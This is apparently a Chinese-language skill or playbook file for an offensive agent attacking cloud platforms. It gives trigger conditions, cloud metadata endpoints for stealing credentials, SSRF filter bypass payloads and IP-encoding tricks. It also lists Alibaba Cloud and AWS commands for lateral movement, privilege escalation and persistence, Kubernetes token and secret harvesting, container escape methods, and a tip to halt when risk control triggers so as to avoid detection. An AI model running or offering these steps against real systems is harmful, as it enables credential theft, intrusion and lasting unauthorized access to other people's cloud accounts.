# Cloud Attack — 云安全攻击

## 触发条件
- 目标运行在云平台 (AWS/阿里云/Azure/GCP)
- 发现 SSRF 可打内网 / K8s环境 / 容器化部署 / Serverless
- 关键词: "云安全"、"Metadata"、"横向移动"、"K8s逃逸"、"容器逃逸"、"无服务器"

## 核心 Playbook

### §1 Metadata 窃取
**各云平台Metadata端点**:
```
AWS:   http://169.254.169.254/latest/meta-data/
       IMDSv2: TOKEN=$(curl -X PUT ... -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
阿里云: http://100.100.100.200/latest/meta-data/
GCP:   http://metadata.google.internal/computeMetadata/v1/... -H "Metadata-Flavor: Google"
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true"
```

### §2 SSRF -> 云凭证
**DNS Rebinding绕过** (CVE-2026-27127):
1. DNS第一次查询返回正常IP -> 2. 校验通过 -> 3. DNS缓存过期，第二次返回169.254.169.254 -> 4. 窃取凭证

**IPv6映射绕过** (CVE-2026-42449):
```
http://[::ffff:169.254.169.254] | http://[::ffff:100.100.100.200]
```

**11种IP编码绕过**:
```
十进制: http://2130706433 | 八进制: http://0177.0.0.1
十六进制: http://0x7f.0x0.0x0.0x1 | 短IP: http://127.1
IPv6: http://[::1] | xip.io: http://127.0.0.1.xip.io
```

### §3 阿里云横向移动
**权限探测**: `aliyun sts GetCallerIdentity` / 错误码反推 (AccessDenied=Deny / Forbidden.RiskControl=立即停止)

**4条横向路径**:
1. **云助手** (隐蔽): 无需SSH Key, `aliyun ecs RunCommand` 直接下发命令
2. **RDS横向**: 从已控ECS直连RDS (ECS IP在RDS白名单)
3. **OSS遍历**: 遍历Bucket找备份文件 -> 下载SQL dump -> 提取用户数据
4. **VPC穿越**: 检查云企业网 -> 确认跨VPC连接 -> 横向跳板

### §4 AWS 横向移动
**权限枚举**: `aws sts get-caller-identity` / `aws iam list-users` / `aws s3 ls`
**提权路径**: IAM角色信任链 -> STS AssumeRole / EC2实例角色 -> SSM RunCommand
**持久化**: 新建IAM用户+AccessKey / 跨账号AssumeRole / Lambda触发器 / SSM Activation

### §5 Kubernetes 攻击
**信息收集**: `cat /var/run/secrets/kubernetes.io/serviceaccount/token` / `env | grep -i secret`
**容器逃逸**: 特权容器(cgroup release_agent) / Docker Socket挂载(docker exec) / /proc逃逸(CVE-2019-5736) / CAP_SYS_ADMIN(mount host) / hostPID(nsenter) / hostNetwork

### §6 无服务器攻击
- 环境变量泄露 (API Key/DB密码)
- 函数代码注入 (通过事件输入)
- 权限过度 (函数角色)
- 冷启动数据残留 / 依赖漏洞

## 工具链
- AWS: aws CLI, Prowler, ScoutSuite, pacu
- 阿里云: aliyun CLI
- K8s: kubectl, kube-hunter, Trivy, CDK (Container Duck)
- 通用: nmap, nuclei cloud templates
